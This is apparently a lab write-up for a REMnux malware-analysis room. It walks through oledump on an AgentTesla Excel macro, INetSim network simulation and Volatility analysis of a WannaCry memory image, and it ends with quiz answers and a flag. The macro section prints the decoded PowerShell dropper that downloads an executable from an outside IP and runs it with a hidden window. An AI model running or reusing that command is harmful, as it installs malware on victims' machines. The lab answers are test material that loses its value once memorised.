## REMnux

### Introduction

Analysing potentially malicious software can be daunting, especially during an ongoing security incident. REMnux is a specialised Linux distribution preloaded with many analysis tools (Volatility, YARA, Wireshark, oledump, INetSim, etc.) and provides a sandbox-like environment to safely dissect suspicious files and behaviours.

### Learning objectives

* Explore tools bundled inside the REMnux VM.
* Use tools to analyse potentially malicious documents (static and dynamic).
* Simulate a fake network to observe malware network activity (INetSim).
* Become familiar with tools used to analyse memory images (Volatility).

---

### 1 - File Analysis (oledump)

**Tool:** `oledump.py` - analyses OLE2 (Compound File Binary Format) files and shows streams/VBA macro content.

**Task:** analyse `agenttesla.xlsm` located at `/home/ubuntu/Desktop/tasks/agenttesla/`.

### Useful commands

```bash
# show top-level streams
oledump.py agenttesla.xlsm

# view the 4th stream (example: VBA/ThisWorkbook)
oledump.py agenttesla.xlsm -s 4

# decompress VBA to make it readable
oledump.py agenttesla.xlsm -s 4 --vbadecompress
```

### Key findings

* The tool indicated a stream containing macros (`M` marker): `VBA/ThisWorkbook`.
* After `--vbadecompress`, a PowerShell command string was revealed (variable `Sqtnew`) which, after replacements, becomes:

```text
powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } PassThru; Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" -OutFile $TempFile; Start-Process $TempFile;
```

Breakdown:

* `-WindowStyle hidden` - hides PowerShell window.
* `-executionpolicy bypass` - bypasses execution restrictions.
* `Invoke-WebRequest` - used to download a file (`Doc-3737122pdf.exe`) from the URL.
* `$TempFile` - downloaded file is saved in a temporary filename and then executed.

### CyberChef tip

Use CyberChef's **Find / Replace** twice to remove the obfuscating `*` and `^` characters to produce the readable PowerShell command.

---

### 2 - Fake Network for Dynamic Analysis (INetSim)

**Tool:** `INetSim` - Internet Services Simulation Suite; used to simulate common services (HTTP, HTTPS, DNS, FTP, SMTP, etc.) and capture network activity from malware in an isolated environment.

### Setup and run

1. Identify the REMnux VM IP (e.g. `10.201.84.158`).
2. Edit the INetSim config and set `dns_default_ip` to your REMnux IP:

```bash
sudo nano /etc/inetsim/inetsim.conf
# locate and change:
#dns_default_ip  0.0.0.0
# to:
dns_default_ip  10.201.84.158

# verify:
cat /etc/inetsim/inetsim.conf | grep dns_default_ip
```

3. Start INetSim:

```bash
sudo inetsim
```

Look for `Simulation running` in the output.

### From AttackBox (simulating the victim/attacker client)

* Download fake payloads from the INetSim HTTP server (ignore the self-signed certificate warning):

```bash
sudo wget https://10.201.84.158/second_payload.zip --no-check-certificate
sudo wget https://10.201.84.158/second_payload.ps1 --no-check-certificate
```

* These files are fake samples served by INetSim; executing them will typically direct you to INetSim's homepage (simulated behaviour).

### Report

* INetSim stores connection reports in `/var/log/inetsim/report/`.

```bash
sudo cat /var/log/inetsim/report/report.<session_id>.txt
```

* Example entries show `HTTPS connection, method: GET, URL: https://10.201.84.158/second_payload.ps1` etc.

**Exercise answer:** Downloading `flag.txt` via:

```bash
sudo wget https://10.201.84.158/flag.txt --no-check-certificate
```

Flag: `Tryhackme{remnux_edition}`

From the report, the method used to retrieve `flag.txt` was: `GET`.

---

### 3 - Memory Investigation & Evidence Preprocessing (Volatility + strings)

REMnux includes Volatility 3. A common investigative practice is to preprocess evidence by running multiple Volatility plugins and saving their outputs to text files for later analysis.

### Useful Volatility 3 plugins (Windows-focused used in this room)

* `windows.pstree.PsTree` - lists processes in a tree (parent/child).
* `windows.pslist.PsList` - lists active processes.
* `windows.cmdline.CmdLine` - process command line arguments.
* `windows.filescan.FileScan` - scans for file objects.
* `windows.dlllist.DllList` - lists loaded modules (DLLs) per process.
* `windows.malfind.Malfind` - finds memory regions that may contain injected code.
* `windows.psscan.PsScan` - scans for process objects.

### Example: running a single plugin

```bash
vol3 -f wcry.mem windows.pstree.PsTree
```

### Preprocess all plugins in a loop and save outputs

```bash
for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree \
              windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan \
              windows.dlllist.DllList; do
  vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt
done
```

This creates files like `wcry.windows.pstree.PsTree.txt` etc., which speeds up later analysis.

### Strings extraction (ASCII & Unicode)

```bash
strings wcry.mem > wcry.strings.ascii.txt
strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt
strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt
```

### Notable outputs from the lab (examples)

* `PsTree` showed a suspicious process named `@WanaDecryptor@` as a child of `tasksche.exe`.
* `Malfind` identified `csrss.exe` and `winlogon.exe` as processes suspected of injected code.
* `DllList` showed the binary `@WanaDecryptor@.exe` located at: `C:\Intel\ivecuqmanpnirkt615`

---

### Quick Q&A (answers from the lab)

* **What Python tool analyses OLE2 files?** `oledump.py`
* **Which parameter selects a specific data stream?** `-s`
* **Which command is used to download files in the decoded PowerShell?** `Invoke-WebRequest`
* **What file was being downloaded?** `Doc-3737122pdf.exe`
* **Where is the downloaded file stored?** `$TempFile`
* **How many data streams did `possible_malicious.docx` present?** `16`
* **At which data stream did the tool indicate a macro?** `8`
* **What plugin lists processes in a tree by PID?** `PsTree`
* **What plugin lists active processes?** `PsList`
* **Which Linux utility extracts ASCII and Unicode strings?** `strings`
* **First process Malfind flagged for injected code:** `csrss.exe`
* **Second process Malfind flagged:** `winlogon.exe`
* **Path of `@WanaDecryptor@.exe` from DllList:** `C:\Intel\ivecuqmanpnirkt615`

---

### Bonus Tip - Searching / Highlighting in terminal

If you want to filter or highlight occurrences of `WanaDecryptor` from a large Volatility output:

```bash
# show only matching lines
vol3 -f wcry.mem windows.dlllist.DllList | grep "WanaDecryptor"

# highlight matches but keep full output
vol3 -f wcry.mem windows.dlllist.DllList | grep --color=always "WanaDecryptor"

# show 5 lines before and after each match for context
vol3 -f wcry.mem windows.dlllist.DllList | grep -A 5 -B 5 --color=always "WanaDecryptor"
```

---

### Conclusion

This REMnux room provided hands-on experience with static file analysis (`oledump.py`), setting up a simulated network environment (`INetSim`) to observe network behaviours and downloads, and preprocessing memory evidence with Volatility and `strings`. REMnux bundles many more tools worth exploring - create follow-up rooms to deeply practice with each tool (YARA, Wireshark, ROPgadget, etc.).

